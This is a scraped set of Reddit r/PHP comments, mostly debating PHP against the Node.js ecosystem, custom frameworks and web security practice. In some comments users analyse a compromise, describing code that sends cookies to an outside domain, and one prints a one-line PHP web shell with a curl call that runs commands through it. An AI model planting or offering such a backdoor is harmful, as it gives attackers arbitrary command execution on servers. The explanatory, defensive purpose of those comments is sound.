&gt; How many people lint their PHP? PHPStorm lints the living shit out of my PHP. Webpack is neat and all, but version control handles the accidental deletions and what not. However, webpack is great for minification. Composer works great for all of my PHP dependency needs. Call me a curmudgeon, but I tend to manually update front-end libraries instead of using something like bower. It's not that I am opposed to bower, it's just that I haven't felt a need for it. Further, I tend to keep the count low and use them in their pre-minified form. For the CSS and JS that I write and is not part of a library I will often not even minify it. Default NGinx gzipping for static assets will get me 80% of the way to the theoretical limit of small size right out of the box. Of course, this is only valid for apps that have a low amount of JS in the first place (like mine). 
I recently built a small meteor project to play around with node typescript and angular2, all new tech to me, and while I feel like they got a few things really right, it was really confusing. I really liked the websocket aspect of it, pushing from the server to the client without any sort of client side request, and having the build/run/watch portion of the tools built in was nice too, although you can definitely get gulp or grunt to do the same thing with a normal node app. All in all I think it can be a useful library, but has some significant challenges reaching outside of it's built in functionality, at least for someone new to node.js.
Does Mongo still quietly throw away data under certain circumstances? Jeez, some people really criticize MySQL, but Mongo takes the cake. MySQL has always been extremely reliable for us. :)
Should have said "for lack of a better word" but I was referencing this: &gt; I'll wear my zero points like a fucking badge, assholes! :) 
&gt; What would you consider the biggest gotcha's that you wish you would have known before you started? It's extremely painful, especially for an OCPD type like me, to make decisions on platform APIs. I obsess endlessly on what an API should be, because once the decision is made, you can't change it lightly. This is in contrast to apps, where refactoring is far more frequent, and less painful, as an app is mostly a self-contained product. While a framework, once it starts getting users, you're locked, and every "improvement" is not an improvement, it's a "BC break". &gt; What aspect(s) of your framework took the longest to complete? API designs. &gt; What aspect(s) are you most proud of? API designs. Basically it's all about the APIs. The implementation can suck, but if the API above it is correct, the implementation can be improved over time. But if you get the API wrong... then the battle is lost. &gt; I was curious if anyone else had some lessons learned they'd like to share. Essentially, don't make just another MVC framework. Dare to decide *what* your framework should be used for, then make it *really good at doing just that, and nothing else*. Look at the PHP landscape. The most popular frameworks are not Laravel and Symfony, contrary to what many believe. The most popular frameworks are WordPress and Drupal, people have built literally everything on top of a blog app and a CMS app. Of course, maybe you want to be general purpose, like Laravel and Symfony. Then, again, don't just make just another MVC framework. Don't program routers, template engines and ORMs. Figure out what problem you want to solve that other frameworks don't solve at all, and dare to be different. Also don't be afraid to pull in existing components in your framework. Not everything should be custom implemented. Just write yourself interfaces and adapters, and you'll remain independent.
Man I know this is the PHP subreddit but this is quite the circlejerk going on here. Makes me sad everyone is encouraging it instead of advocating learning or whatever. I can't unsubscribe from this subreddit fast enough.
&gt; What would you consider the biggest gotcha's that you wish you would have known before you started? It takes unbelievable amount of effort when writing from scratch or partially with third-party tools. &gt; What aspect(s) of your framework took the longest to complete? I don't think it is ever complete. Occasionally I find some features that can be significantly simplified, sometimes I redesign certain things. It works really well, but I'm not sure it can be complete. It is only complete when it is dead. &gt; What aspect(s) are you most proud of? How everything is organized, how easy it is to use and how simple stuff are under the hood. I'm quite proud of balance here. &gt; I was curious if anyone else had some lessons learned they'd like to share. Never start writing framework just for the sake of doing it. Better write some small really useful library for certain use case (even if library will consist of 100 LoC in single file including comments). Making framework-scale things is a very long and tough process, so you better have strong understanding of what are you doing and why it is going to be better than alternatives. It is also very easy to lose balance between implementing everything to fit every possible use case and not enough to be really useful.
&gt; babel Without TypeScript, I lose autocomplete. I'm too old to code without autocomplete (Intellisense?). &gt; Karma, PhantomJS, (Chrome, IE, Safari, FireFox) Karma is the only solution for testing JS in multiple browsers that I know of. Not testing my code in the environment that it will run on is a complete non-starter. I'm too old for cowboy coding. &gt; mocha, chai I prefer old school xUnit assert style syntax. &gt; Gulp For simple build tasks, NPM scripts can be used. I'll give you this one. &gt; nginx For enforcing SSL, serving static assets, gzipping, rewrites, redirects, and a plethora of other things, I prefer to use a proper web server. I prefer NGinx, but Apache will work too. In any case, I'm just not going to allow node to serve static assets, among other things. That being said, I've been doing this long enough that configuring a web server is a simple task. &gt; sinon If we limit ourselves to stubs, we can dump sinon. However, for a full xUnit style mock that watches call counts and what not, Sinon (or something similar) is required. If forced, we can probably change our testing methodology and avoid heavy mocking and dump sinon too. I'll give you this one. &gt; Angular It seems to be the de-facto choice. I agree there are better options. &gt; Angular-mocks Required for testing Angular in any meaningful way because Angular has issues. &gt; webpack and gulp Gulp allows more than webpack does. But, sure we can kick gulp to the curb. So, that leaves all of the same options except Gulp and maybe sinon. That still doesn't answer the fact that Angular, commonJS, and unit testing don't play well together. Angular, bower, and unit testing work well, but when you throw commonJS into the mix and ditch bower things go south. Also, Angular and commonJS can be used together if you don't mind not unit testing. I do mind. If we kick Angular to the curb, then things get much better but we lose employability. If we kick heavy front-end JS to the curb and stick with mostly progressive enhancement and jQuery, then everything becomes a breeze. In that scenario, we can use the much simplified following tech stack: * Node * NGinx * MySQL * Handlebars/EJS/Demarko (my mind thinks in HTML at this point, so jade is a no-go) * Mocha (we can use the built-in node asserts even though the docs say not to and skip chai, let's skip sinon too by changing our testing methodology) * TypeScript (it's basically ES6 with autocomplete, this makes it more or less just like babel, but with autocomplete) * Typings (this is not too bad and and is fairly easy to set up and master) * NPM (is awesome-sauce) * Express (obviously) I dunno about you, but this is a nice tech stack with all of the bells and whistles I need for most applications I write. If we use old school progressive enhancement, we can skip Karma, webpack, phantomjs, gulp, angular, and angular-mocks. I'm still kicking all of this around and haven't made a complete decision yet. I do have a nagging feeling that JavaScript is the future of web development, at least for the next 10 years. 
No one is not advocating learning. We are discussing our experiences trying out new tech. Obviously, the goal is to find something that works better than what we are using right now. So far, my single experience, today, indicates I haven't found the "something better" part just yet. It doesn't mean it doesn't exist. It doesn't mean it's not Node. It also doesn't mean PHP doesn't serve our needs really well currently. At this moment, PHP is the best tool for the jobs I have sitting in front of me. But, I'm not a language bigot. Like I said, I'm open to new stuff if it works better for my needs. I think that is true for most people here. You should resubscribe to this reddit. 
&gt;PHP &gt;sanity
&gt; the Node community is extremely toxic Can you elaborate on this? I've not found it to be so. 
&gt; every "improvement" is not an improvement, it's a "BC break" Preach it.
Meteor is fun to prototype some stuff with, but it's too much "magic". Too much of a black box.
I don't remember all the details, but I could dig through my sent box and try to locate all the debugging results I sent out to my team to research solutions for. Sounds about right though. [EDIT] Some snippets from emails: -Meteor occasionally spits out this error: Unexpected Mongo exit code null. Restarting. -I have also noticed this error message regarding our duplicates: MongoError: insertDocument :: caused by :: 11000 E11000 duplicate key error -This one is more specific, but I don't think it's necessarily crashing our db.
I ran into similar issues with Rails. Something would break and I was fucking clueless on how to get back to working again. I like PHP in the same way I like C. You lay down code, and you know what exactly you're getting. It's very obvious. This is also a reason I don't EVER use big frameworks, just libraries here and there. If something breaks, I know it's more than likely MY code and I can usually fix it very quickly.
Fun fact: Download install Intellij's free node.js plugin in PHPStorm and it's basically Webstorm with extra PHP Stuff.
PHP is and was from the beginning a Domain Specific Language made for the web. It's really hard to beat PHP at making it easy for someone to receive a HTTP request, do something to it, and return a fully compliant HTML document. This, and especially now since the community prodded PHP Internals into waking up, is what really makes PHP hard to beat when it comes to web dev.
Try Phalcon, if Laravel is too slow for ya.
[removed]
You have to admit that when it comes to fluff, the current JavaScript eco-system is a whole different kettle of shit by itself. I mean, I swear I do not know what AMD is in the context of a JS webapp, I still think AMD are the people who made the processor in my computer. I just gather that neither Gulp nor Grunt is the new hottness, apparently it is Webpack now. MongoDB is still in vogue, because of it still being "web-scale" and all. ES6 is happening but you need Babel with something else to make it work. Or is it ES5? CoffeeScript is not happening but TypeScript may have a chance. A boiler-plate project in whatever flavour of the month JS frontend you choose it still 200+ node modules, with folder recursion so deep Windows has problems deleting the folder. One line node modules are still a thing. Etc, etc. I don't mean to harp on JS as a language, I am railing on its eco-system and the hell-hole it has become. You don't hear this from PHP devs and Composer, or Ruby devs and gems, or Python and PIP, or Java and ???. Why must it be like this with JavaScript?
For better or worse, I've been doing this my entire life. I don't know why, but architecture is like the only part of programming that really puts me into a flow. And it's honestly kind of a problem, because there's a lot of other things that I'd really like to work on. That said, it has taken me YEARS (omg) to get something that I now finally stop editing every day. When I say years I don't mean "Yeah, I worked on it a few days last month" - no, I mean, I spent years where I didn't have to go to a job because I was making enough money on the side that I could devote my time to building architectures. When I say I've spent years, I really mean it. &gt; What would you consider the biggest gotcha's that you wish you would have known before you started? That I was a total idiot for not working with established architectures first. (sigh) Seriously, I could have saved an enormous amount of time by working with quality work first. Granted, yes, you can learn a lot by stumbling through it on your own; but you will probably learn that anyway when you get around to doing it yourself. If you're not working with someone else's stuff as a learning process, you're wasting time. I'm not saying you're doing it wrong, because maybe time isn't as valuable as the joy of figuring it out yourself, but you're DEFINITELY wasting time if its anything but entertainment value. I've worked with really awful codebases that I looked at and thought "Who in god's name would EVER come up with something that broken and terrible?" and still found little gems. I've also seen really amazing codebases that basically did 90% of what I spent many years trying to figure out on my own and thought "Wait, they did that too? And I could have just looked at this as an example?" &gt; What aspect(s) of your framework took the longest to complete? Eeehhhhh.. mostly the constant revisions. When it comes to architecture, I'm *insanely* perfectionist. I don't know if this will apply to you, but my goal was basically to create an architecture that was "perfect" in my mind; easy as hell to use, extremely easy to understand and follow, extremely optimized and very lightweight, extremely secure, never gets in the way, and still powers everything like a boss. But doing that required me to re-architecture the system CONSTANTLY. Like every week I basically rebuilt massive aspects of the system; entire overhauls were common. As for individual aspects, I have no idea. Maybe the constant revisions to the security-related classes I went through. &gt; What aspect(s) are you most proud of? I am **super** proud of how insanely slim it is after all this time. Almost every project is I see is bloated as nonsense and just utterly horrifying. Not mine. It seems in programming people spend more time adding code than removing it, but I'm the opposite. The actual amount of code in my project is MINUSCULE compared to the work I've actually done on it. To give you an idea of that, I could *probably* rebuild my entire infrastructure in a few hours if I ported the classes. I do that once in a while just to trim the fat, and its due for a cleaning soon. The nice thing is that now every time I have a project I want to build, my development time is a fraction of what it would be on any normal production code, and I can be assured of its heavy optimization and security while doing it. So, in the end, I have found this process to be worth it.
Death to JS/MERN/MEAN/ANGULAR! Long live PHP!!
Its better to just store it server side along side the one time token.
Once you get the hang of programming for asynchronous callbacks it is really nice. I use both PHP and Node, but pretty vanilla for both. I have my own libraries to pull from for PHP and pretty much stick to Express as the middleware/router for Node (along with npm). I really just like how easy it is to start a million processes and finish up with a bow. It makes some things a lot faster. [Here is a very simple app that I wrote in Node that would have likely taken much longer had I written it in PHP.](https://github.com/MattSandy/subreddit-scraper) 
&gt; I would say this is a minimum tech stack. You would be wrong. First of all, the frontend side of this is almost irrelevant. I say almost because you mentioned a desire to share code between both sides of the site. In 3 years doing node dev I've not yet encountered a single solution for universal JS which isn't a massive clusterfuck of over-engineering (_especially_ the React stuff). It's a pipe-dream In the real world most of your frontend code is going to be separate from your backend, just like it would be in PHP. Frontend tooling like gulp and webpack, or tools like karma for running frontend tests, are going to be exactly the same for a PHP application running the same logic using the same HTTP requests. The only differences are on the server. Nginx is a piece of both stacks, so that's irrelevant. NPM comes with node and thus shouldn't be mentioned separately, but if you must then it falls in the exact same position as composer. So, again, irrelevant. MySQL is also part of both stacks... irrelevant. The absolute minimum that you need to setup a server side application in Node is express + body-parser + a database driver (node-mysql2, for example). You _might_ want some kind of template library, but as of node 4 JS template strings are available, so you don't really _need_ it. You'll also likely want to use lodash to fill in for the gaps in JS's standard kit, but with Node 6 you have full access to ES6 and some of ES7, which significantly improves the toolkit. That's it, 3-5 libraries and you can have a fully functional website. Compare that to your average Symfony or Laravel stack and it's a pretty huge difference. You don't _need_ typescript any more than you _need_ type hinting in PHP. People have been writing both JS and PHP for decades without static types, it's perfectly acceptable. You don't _need_ mocha, chai or sinon for testing, Node has its own assert module built right in and you can execute multiple test files using shell wildcards. These libraries are just nice-to-haves (and aren't even the best tools available, just the most well known). You probably will need proxyquire, however, to do in-module dependency injection for your tests.
PHP on the backend, Angular on the front end over here, and we couldn't be happier. Angular is a huge help on the front end with its 2 way binding as a default. Our PHP app is pretty mature with unit tests so we just make an API endpoint that Angular can hit when we want the front end to converse with the backend to do something. It's been months of wrapping my head around Angular and injecting it into our massive app, but it's totally worth it. The front end is becoming fun to me once again.
Thanks for sharing my experience, i feel a bit less retarded now.
I find the satisfaction of being able to architect something rather than simply write a solution to a single problem gives me much more of a mental workout. It's not a case of how do I solve problem A, but how do I define problem A, which also solves B, C and Q. I always seem to fit code generators into my projects somewhere as well - although this may be the lazy side of how to create boiler plate code accurately, with comments and consistency. The hardest part of any project which is self generated for me is project creep - you write a section of code and then realise how great it would be to add another feature. So you mod the code to cope with that and then refactor the code to make it solid and then find another new feature :( One great thing to help with this though is to get unit testing right - refactoring code, I feel, to make it trap errors, cope with edge cases etc. is essential. Making sure that the thing still works as it did prior to refactoring is priceless! Although with my current project - as I'm trying to get back into PHP has been good to try and build unit testing into it, as I want to use this project as a way back into work after some time off. Hopefully this project will make it out into the wild, but as to it's level of usage - who knows. Perhaps this would be the hardest part - you have this great idea which everyone else has missed - you spend ages writing, testing and making it work just as you envisaged. Then it sits on the shelf for the next couple of years as the need you perceived seems to have also been missed by everyone else out there and so no-one seems to want to use it. Could you cope with the idea that your masterpiece is perhaps not as popular as you thought? As I mentioned, what I'm working on now is a 'get back used to PHP', 'show them I can write solid code' type project. If it gets me into a job, that's is my measure of success. 
[removed]
Yeah, but it is a bit bad tho... I have many reasons that I dislike Doctrine, but that's not one that would stop me from using it.
Just remember *leftpadgate*
Is it? I thought this subreddit was about PHP, not about denying the reality? I do program in PHP and I like to read about it and relevant projects. But I don't pretend PHP is more sane than JS, because it isn't.
Just to make clear: I wrote meteor just because the thread creator wrote about sharing code on client and server side. And thats what it all is about in meteor. So when he would like to test some new JS stuff, I would go for meteor. But for me its at the moment also not a solution for developing business applications. Reasons see below. Now upvote again pls, because we have cool discussions here :-)
If you can't even be positive about PHP in /r/php , where can you?
Personally it's not Javascript I have the problem with. It's the NodeJS environment that sucks.
This is a bit of a rant but here's my take on the first question: I think the biggest gotcha's in my case appeared after the first project based on the framework was completed. The fact that backwards compatibility went out of window with each new project we created based on our home-grown framework. The problem is, the framework is never mature, you always make changes which eventually break backwards compatibility. Revisiting older projects running on older versions of the framework takes a long time to switch into the context of the older version. Maybe its partly due to bad organisation/documentation but it turns out no matter what you do the community driven frameworks will always have more developers documenting and resolving issues than your company. 
From what I can see it uses curl (or fsockopen if curl is not available) to send whatever is in $z variable and cookies to http://$G.$o and echoes back whatever that site is returning (probably some malicious js code) and copies some headers from response. $z is not defined in code sample that you've pasted (nor $m/$w which is added to cookies) so no idea what you've just lost. $z is probably an array or object since it is used as http_build_query parameter... probably $_SERVER or $_SESSION or whatever is there to store some kind of sensitive data in WP
From skimming over it I'd say it tries to steal your cookie/session and send it to "alterbin.org/proxyfolder/timpjevavixp" But I could be wrong. This is just my first quick impression. 
I do know that Mongo may not return a document from a query, if it's being updated at that exact moment. Even if the document would match the search condition before *and* after the update.
Folks come asking this type of question often here. I wonder why does it matter what the code does? If someone can write code to your server, the only safe assumption is they can do whatever they want.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
I've written three MVC frameworks and one datamapper-ish framework from scratch. These were all pre-2011 so before the Composer and Packagist revolution. The answer to your first two questions is: documentation. Writing the code was relatively easy (and fun!) for me, but writing documentation takes just as long, if not longer, as writing the original code. It was surprising because you think "hey, they're developers, they'll just dive right in and read the code to figure things out." Nope, they have just as much stuff on their plate as yours, better provide good docs. I'm most proud of how fast and lightweight I could get my frameworks. Granted, they didn't do nearly as much as some of the big modern ones do (and I use Symfony for _everything_ so I'm definitely a fan of modern frameworks).
https://en.wikipedia.org/wiki/Single-page_application
It's not that easy, but sure, it's doable.
It isn't. It's not a driver and uses PDO connection, so being faster than native driver is ridiculous statement. It might as well add that it's faster than Usain Bolt, while we are comparing things that are doing completely different tasks. Semantics aside, it claims to be faster because it uses multiple queries with IN() instead of SQL joins, which also seems pretty dubious and not comprehensive. Even if it is a tad faster in some simple cases with very small number of records (where it doesn't matter much anyway) and maybe few other specific cases, generally database engines are well optimized and proper, indexed joins will perform on par or better without additional overhead from having to run multiple queries. The whole idea looks pretty dumb.
&gt; You know you can add type hints in your doc comments to support WebStorm's code completion? (same goes for PHPStorm btw) But why not use TypeScript so that you get auto-complete _and_ type safety? 
I don't think the intention of the question was to know if the code can be ignored. If you find such malicious code it sure is helpful to know what damage it could have done - like "were my user accounts in danger", "did i potentially lose any data", "how sever was the compromise of the system?" etc. You are right in saying that this potentially could have done anything, but why not investigate further?
I think we should have a sticky thread so they're all in the one thread and that way it's not a new thread every other week.
For the fun of it, before composer and really even git was a thing in my life, my job handed me contact that had a particular need that i want quite getting from codeigniter So i started from scratch, focusing first on fulfilling the needs of that job, and built a lot of my design patterns around codeigniter as inspiration. Eventually i had a tiny mvc framework that in bonus also solved the issue i was having. But i decided to continue on with it, and package the CMS i was building for that site into a more generic target and boom i had a CMF that the company i was working for could reuse, and i called it Kerosene. 1. What do i wish i knew before going in? Namespaces and traits, and the PDO class 2. What took the longest? The db query builder. Lots of testing this that and the other thing. The model hydrator also took me a while of properly understanding reflection classes to do proper 3. What was i most proud of? When i handed the system to my supervisor, the obky thing in told him was to try and break it, and he couldn't. He complimented the speed of page loads, the accuracy of the data handling, and particularly praised the CMF for its handling of multi domain content management and image post processing + on the fly thumbnails. He tried every which way to cause a 500 or see some or of place info dump and he couldn't. He congratulated me and i went on to work on that cms for another month as part of another clients site before i found another opportunity elsewhere The company didn't take too long after i left to replace everything i did with Wordpress. 
&gt;A long time PHP developer steps out of the cave. "Damn it's too bright!" 
Thank you. Yeah, i live in Europe. Wages here locally are really low... So if i could get 50€ for an hour, i would be a really happy man. I have thought a lot about finding work outside of my country, i mean, remote coding work. But last time i tried it, 2 years ago, i could not get my foot in, as they say. These chinese and indian coders worked with so low wages that I, as a newcomer on the freelancer site, couldnt beat their 5-10€ per hour offers when they had many pretty nice samples and a lot of in-site experience to show for while i had none. I also was self taught and only had made PHP code for companies internal use so i cant really show it. Im actually legally not allowed to. Im also no designer, so i cant have beautiful samples to show for. So, my profile always was an awfully blank one. Only offer i had after 2 months was with a client who just changed their mind and didnt want the project afterall (i did not finish a single milestone but i put like 16 hours into it and didnt get payed because it was for milestones that i didnt finish because they halted the project). I would be really glad if i could get a chance. I mean, i love coding, im so passionate about it. Self taught people usually do. I read about it after hours and often study new stuff (like Laravel update) in the middle of the night because i was so excited what new stuff they have come up with. I would be so dedicated and hard working if given the chance... so no problem there. I just dont know how to start freelancing. Also, i have terrible self-selling skills... Right now i work at a local very small company. They hired me because i asked low pay and they needed someone to work on a specific long term project but werent able to pay much. I asked low because i wanted to start somewhere and i am self taught (and thats a problem around here - not having a paper). So, im thankful for this 9-5 job and it gives me security. BUT, the pay really is low and it starts to impact my life. I could put 20-25 extra hours per week and if i get 50€ per hour then it would help alot... at least until current project picks up and get some clients (then they can pay me more). If by then i could make more than they can offer with freelancing then i would switch to freelancing full time for sure. Maybe you have some tips? Lets say, if i set my goal to 50€ per hour and i am between intermediate and expert PHP and Laravel coder. I really want this. Maybe i should make a new topic on this matter? 
seems like it's grabbing some information (probably a cookie) and sending it to alterbin.org, a domain held by one Alexandr Ushakov from Kiev, according to a domain-whois. 
If we have to be honest, maintaining a project using a popular general purpose framework, once that framework gets abandoned for the next shiny is just as bad (if not worse). Code Igniter, Symfony 1.x and Zend 1.x users know what I'm talking about. 
The title made me wonder if this was "how to sweep our glaring flaws under the rug without fixing them". Fortunately, it wasn't. The topics covered were: * Password requirements * My advice: * Use something like zxcvbn or passwdqc and tell your users to use something like KeePassX * Use `password_hash()` and `password_verify()`, unless you have a *very* good reason to use something else. If you use proper hashing, limiting the password doesn't make much sense. * Password resets * Basically: If you're hashing passwords properly, you can't even do this, but **don't just email users their password**. Good advice. * (I've got a blog post coming up that covers a lot of other nuances here. This lightning talk wasn't wrong, but there's a lot more to say about this topic.) * TLS (erroneously called SSL) * Use it everywhere. * "Shared SSL" by hosting providers is a bad idea. * Caddy makes this incredibly easy (and free for ACME-capable CAs, such as the ISRG a.k.a. LetsEncrypt). * Error messages * Preventing debug code from hitting production * Git pre-commit hooks * Server errors Overall, it was worth taking the time to listen to this talk.
&gt; Using no framework doesn't mean using no components, libraries and so on. I totally agree. I just understood OP's issues as if the architect didn't trust libraries and components provided by third parties and they had to make *all* functionality themselves. I'm not sure that's the case, but that's how I initially read it.
There's definitely a problem in the Javascript dependency ecosystem. I get why there's constantly new things popping up and why I constantly need to read new articles about the new better alternative to whatever it is that they wanted to replace this week, but I don't get why JS dependencies are they way they are. Laravel currently depends on 61 different composer libraries (that includes `require-dev` dependencies and other dependencies' dependencies) worth about 35MB - That's a whole web framework. The frontend portion, Laravel Elixir (basically just a wrapper around Gulp with some more features) consists of a whopping **331** libraries, totalling at 192MB. Almost six times the amount of dependencies Laravel itself has. To be fair, some of these are duplicates (each library can require its own version of its dependencies, so some of them are installed multiple times, but even so, why is just the *bundler* that doesn't really do all that much depending on 331 (!!!) libraries?
This is precisely the end game for me too. I get more done than my JS colleagues, I get it done faster, and while I've written JS+React, its a ton more overhead and a ton more balancing plates. 
&gt; I wanted to know what it does, The answer pretty invariably is 'allows the attacker to run whatever code they want remotely', or at the very least: 'if they uploaded one script and proved they can upload arbitrary code, they will upload a backdoor to give arbitrary code execution'. &gt;what data has been stolen, No telling from the de-obfuscation of a backdoor like this, especially if you have some lax security elsewhere. What sort of permissions on the system the web server (And therefore the attacker) had dictates a lot of what they could have done without leaving any overly-obvious trail. &gt;how does it do it. Most all such scripts are just a more sophisticated form of &lt;?php echo shell_exec($_GET['cmd']); so that the attacker can just run curl http://your.site/exploit.php?cmd=whoami and sort of use the backdoor as a shell.
For me, at the end of the day, a website/webapp consists involves a user requesting a resource/page and then the website/webapp responds accordingly. All of the above can be done with PHP/HTML and a light sprinkling of jQuery/AJAX. That's it.
Yes, I know about this, but in this case I can do nothing.
I swear I had to just Google "koa". Then that search lead me to Hapi, now I am trying to figure out if these are analogous to Nginx/Apache in the PHP world.
Because that's what I know better and at the end of the day I like to solve problems, not fight with a syntax I'm not used to and with gotchas of the language that for php I know by heart.
The way Jetbrains purchasing model is, you've already paid for Webstorm, might as well just use that.
&gt; the Node community is extremely toxic and there are always bad presses around. PHP will probably still live on for a while You say that like PHP doesn't have it's own share of bad actors and conference drama. I see the exact same personalities and behaviors in PHP that I encounter in JS. Both communities have toxic elements.
Like io.js? http://www.infoworld.com/article/2855057/application-development/why-iojs-decided-to-fork-nodejs.html They merged back in though.
The biggest lesson I learned in supporting (for about 10yrs) a custom in-house framework: don't do it. I would never even think of rolling my own ever again. There are several good ones available built by great devs. Pick the least opinionated framework and work off that. Or a pick a micro-framework and build off that. The common and repetitive problems that devs face everyday are solved in these frameworks. The effort is not worth the payoff - quite the opposite in my experience.
I would use one or the other right ? If I was to use $app-&gt;post('/route', function() use ($app) { $parsedBody = $request-&gt;getParsedBody(); // I would access fields like $fieldName = $parsedBody['name']; // correct ? }); Alternatively the second command would allow me to do something like this: $app-&gt;post('/route', function() use ($app) { $name = getParsedBodyParam('name'); // correct or am I missing something ? }); Because the two commands you added dont seem to be necessary for each other
I don't have a strong JS preference, so I am naturally curious: what made you switch to Vue?
Vue is MUCH easier to use and in my opinion the documentation is much easier to follow. I liked Angular 1.x and was productive in it, Angular 2.x is (what seems to be) a complete shift in thinking and you're almost learning a new framework once over again. Add to the fact my chosen framework Laravel has now embedded vue.js into for the view layer be default its the logical step for me
savage
that first line in bold actually refrained me from this discussion, ive grown too old to fight over facts. he gave you a big red flag, and you immediately disposed of it instead of asking "how so?" 
&gt; Would my backend and frontent have to be fully functional before I can implement this ? Nope &gt; I am looking at ways to protect and secure login information when it is being sent between my Ionic client and my Slim API. How would I go about doing this ? Sounds like you are talking about SSL ... Securing communication between a CLIENT and a SERVER. 
Honestly you'd be better off in the long run setting up an OAuth kind of communication. Once the user logs in once the message, sent with the data via SSL to the API, verifies the user credentials. If passes back randomly generated tokens the app then uses from there on out to talk to the API. Usually this setup will come with a "refresh token" that can be used when the primary token expires to get a new primary token. This way you're not sending user credentials back and forth with each request and you're building on a standardized and widely used auth flow. The problem is usually in that first connection, though - when the credentials have to be sent "in the clear" so to speak. They're actually not as you'd be sending them via HTTPS/SSL but I get what you mean. If you want to encrypt the traffic after that you could always generate a randomized key that's then shared between the backend and frontend, different for each user of the system.
Yes, I was actually wondering exactly that ! How would I secure the initial sending of username+password before messing around with api_keys. (In the API I encrypt the password before sticking it in the DB) As for the api_keys I am guessing they would not have to be encrypted ? I was thinking of issuing a new one every time a user logs in. Updating the DB and use it till it changes. And how would I send stuff in HTTPS/SSL ? Would I just need to have a HTTPS server and it would be done automatically, or is there more to it :P I have never set-up or used HTTPS in a website/web server before.
Indeed, but sending a query off to MySQL *is* parallel. MySQL can process your query while Node continues to do other things. I believe, but I'm not 100% certain, that reading and writing to disk (i.e. a lot of the 'fs' funcs) are actually parallel. Userland-code however, is not, *unless* you use web-workers.
I just had a thought about not sending a password via email. What's the difference between sending a username / password (which will expire shortly) and sending a link (which will expire shortly) via email? While I agree it's not smart to send even temporary passwords via email - these reset links do the same thing - to use his words: "give you 100% of the information required to log in". Given the password you would log in and be asked to change your password. Maybe kick-in an extra verification email for good measure. Given the link you would likely click and be required to immediately input a new password and again an extra verification for whatever good it's doing. I'm not seeing a big difference overall.
&gt; What's the difference between sending a username / password (which will expire shortly) and sending a link (which will expire shortly) via email? * Sending the old password: You're doing it wrong. * Creating a new username/password pair, which expires briefly, and then sending it to the user: You've just complicated your login workflow needlessly. Now you have to properly hash a secondary password and handle it in the workflow gracefully. &gt; While I agree it's not smart to send even temporary passwords via email - these reset links do the same thing - to use his words: "give you 100% of the information required to log in". They're easier to reason about. The fact that password reset features are **a backdoor** is one of the nuances I alluded to, however. Pwn their email provider, you've just gained instant access to most of their accounts (unless HOTP/TOTP-based 2FA is being used). I'll expedite getting the post published as soon as I can, because there's a lot more to say about this topic than I care to commit to Reddit comments at the moment.
It has a quickstart to get you through using a PHP environment to get started with a PHP application (Laravel), and then dives into the docker-compose.yml file, explains volumes and networks, and then goes a bit into building images from a Dockerfile. **Edit:** Signing up will get you some more videos in addition to the mini-course, and of course coupons and stuff on launch day **Edit2:** Thanks for the kind words!
&gt; Webpack is neat and all, but version control handles the accidental deletions and what not. Recovering the file after it's gone isn't the problem, it's catching it before you deploy. &gt; Further, I tend to keep the count low and use them in their pre-minified form. If you're concerned about size, then you really should be using webpack and just include the bits you need. A lot of libraries are going modular these days so that you can *not* include 80% of the library if you're not using it. The bigger advantage is that you get to use `require()` and write your code in a nice modular way without polluting the global scope. 
Also, PHPunit planned...
No you implied that I claimed that paralellism is a fallacy. I never said that. What I actually said, is that the gain of paralellism isn't always given due to the nature of web apps. The fallacy is assuming that paralellism will always make a web app faster. 
Bad network here... So Reddit glitches out!!
Unfortunately Angular's default 2-way binding causes massive performance problems (especially in lists), which is why A2 has gone the route of one-way binding by default. The only trouble is, A2 is the equivalent of FizzBuzz Enterprise Edition. SOOOOO much setup and boilerplate compared to A1, plus you need to learn TypeScript as A2 and its docs treat vanilla JS like a second class citizen.
I am not certain why it didn't work. You should try it though. Also, you need to be doing some amount of unit testing, even when learning. In fact, if I can't get a unit test version of hello world going pretty quickly after the regular hello world, then I stop investigating a new tech. I consider testing to be that important.
I see this (and similar) throughout: ``` $_SESSION['member_is_logged_in'] ... ``` If the "host" application is using those session keys, you will have overwritten them with your own. If possible, you should segment your keys away from others, by doing something more like this: ``` $_SESSION['__COMMENTIA__']['member_is_logged_in'] ... ``` That gives you a separate "space" to work in, within the session array, so you don't clobber other non-Commentia values.
I'm honestly not bothered by PHP 4 installs anymore. In the early to mid PHP 5 days it was a concern, because shared hosting had a habit of locking people into these old versions for fear of not supporting the bulk of older scripts. With containerization being wide-spread and available, that's just not an issue. The only sites running PHP 4 today are the ones who literally give zero fscks. The ones who are ready for 7 can and do make it happen at every level of scale. The ones who have compat issues (for whatever reason) are doing just fine on 5.4-5.6 which, despite including EOL versions, are still "modernish" PHPs.
This is a great resource for anyone wanting to understand Docker. Highly recommend it. 
"White hat" demands money.... The only thing that comes to mind is the old -s cgi vulnerability. http://www.cvedetails.com/cve/cve-2012-1823 Or maybe unsecured uploads (i.e. allow users to upload files which then get put in the document root)
A white hat would have told you what the vulnerability is; you have an extortionist. Unfortunately there are any number of ways they could have gotten a look at your source. * A misconfigured httpd might be offering the files up for download instead of parsing them as PHP (even Facebook was hit by this some years ago and much of their source was leaked) * An arbitrary file inclusion bug might let someone abuse an "image serving" or "file downloader" script, making it display files it wasn't intended to * They could have a back door, perhaps entirely unrelated to PHP, giving them complete control over the entire site/server Are you running WordPress? If so, ensure you have the latest version of WordPress as well as any plugins you're using. It's a huge vector for exploits. There's been a "Summer of Pwnage" project releasing new WordPress vulnerabilities almost daily for the last few months. Check your httpd access logs. Start with the last 24 hours and look for * Weird query strings with unexpected parameters * Very long URLs * Large volumes of hits from single IPs * Requests for files that don't exist on your site These are usually signs of automated scanning and can help narrow down the who/when/how. How did they contact you? Is your email address located on a specific page of your website, like a "Contact Us" page? Or maybe they submitted a contact form? Look and see who accessed those pages today, then look for any other hits from those IP addresses to see what else they were poking around at. Hopefully you can locate something suspicious and try to work backwards from there.
Are you using something like SVN and is your website pointing to a folder with source control in it, because, unless your web server is configured to prevent access to those folders, your web server may happily be serving up what's inside your .svn folders. There are lots of other methods such as arbitrary file inclusion or other misconfigration of the web server, but without more info, it's hard to speculate.
Watched he first one. Very informative and decent pace. Perhaps add one video for what is docker and why to use it. 
